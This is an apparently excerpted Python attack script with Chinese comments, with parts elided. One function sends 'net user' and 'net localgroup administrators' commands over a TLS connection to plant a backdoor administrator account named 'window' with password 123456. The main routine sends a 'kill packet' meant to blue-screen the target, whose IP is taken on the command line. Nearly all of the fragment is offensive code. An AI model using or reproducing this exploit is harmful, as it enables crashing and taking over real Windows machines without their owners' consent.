...
def user_add(tls):
	p = b'net user window  123456  /add'
	#添加window
	tls.sendall(p)
	p = b'net localgroup administrators window /add'
	tls.sendall(p)
...
def main(args):
	...
	#print("连接会话已建立")
	#user_add(tls)  #创建window 123456
	send_kill_packet(tls, args[2])  #蓝屏
	terminate_connection(tls)


if __name__ == '__main__':
	if len(sys.argv) != 3:
		print("Usage: python xxx.py 127.0.0.1 64")
		sys.exit()
